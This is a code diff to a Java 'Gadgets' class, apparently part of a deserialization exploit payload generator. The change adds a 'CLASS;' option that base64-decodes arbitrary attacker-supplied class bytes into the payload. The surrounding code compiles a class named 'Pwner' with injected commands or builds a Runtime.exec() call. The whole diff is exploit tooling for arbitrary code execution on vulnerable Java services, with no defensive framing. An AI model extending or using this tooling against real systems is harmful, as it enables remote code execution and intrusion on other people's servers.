@@ -14,6 +14,7 @@ import java.lang.reflect.Proxy;
 import java.net.URL;
 import java.nio.file.Files;
 import java.nio.file.Paths;
+import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -133,7 +134,10 @@ public class Gadgets {
             String javacode = new String(java);
             javacode = javacode.replace("System.out.println(9999);",command.substring(5));
             classBytes = JavaCompiler.compile("Pwner",javacode);
-        }else{
+        }else if(command.startsWith("CLASS;")){
+            String javacode = command.substring(6);
+            classBytes = Base64.getDecoder().decode(javacode);
+        } else{
             String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                 command.replace("\\", "\\\\").replace("\"", "\\\"") +
                 "\");";
